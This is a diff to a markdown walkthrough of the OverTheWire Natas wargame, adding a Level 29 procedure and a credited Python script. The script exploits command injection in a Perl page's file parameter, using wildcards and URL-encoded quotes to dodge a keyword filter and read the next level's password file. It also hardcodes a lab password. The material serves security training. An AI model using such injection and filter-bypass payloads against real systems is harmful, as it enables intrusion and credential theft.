@@ -966,6 +966,7 @@ else:
         f.write(resp.text)
     print("Saved response to natas28_response.html for inspection.")
 ```   
+This will get you the password for the next level.
 
 ### Natas Level 29 → Level 30
 **Key Takeaways**  
@@ -974,10 +975,36 @@ else:
 * Bypass the filter by breaking the literal natas string with inserted URL-encoded quotes (e.g. na"t"as → na%22t%22as), or try URL-encoded terminators (%0a or %00) to terminate the filename input.
 * Send the crafted GET to index.pl?file=… (HTTP Basic auth for natas29) and the server will execute your command and include its output.
 * Extract the password from the response body (it typically appears plainly).
-* 
+  
 **Procedure**
 
 1. Log in using the username `natas29` and the password from Level 28.
+
+2. Sample script (Credits: John Hammond): https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas29.py
+
+```
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import requests
+import re
+
+import base64
+
+username = 'natas29'
+password = '31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns'
+
+url = 'http://%s.natas.labs.overthewire.org/' % username
+
+session = requests.Session()
+
+response = session.get(url, auth = (username, password))
+response = session.get("http://natas29.natas.labs.overthewire.org/index.pl?file=|cat /etc/na*as_webpass/na*as30|tr -d '\n'", auth = (username, password))
+# print repr(response.text)
+print (response.text)
+```
+This will get you the password for the next level.
+
 
 
 
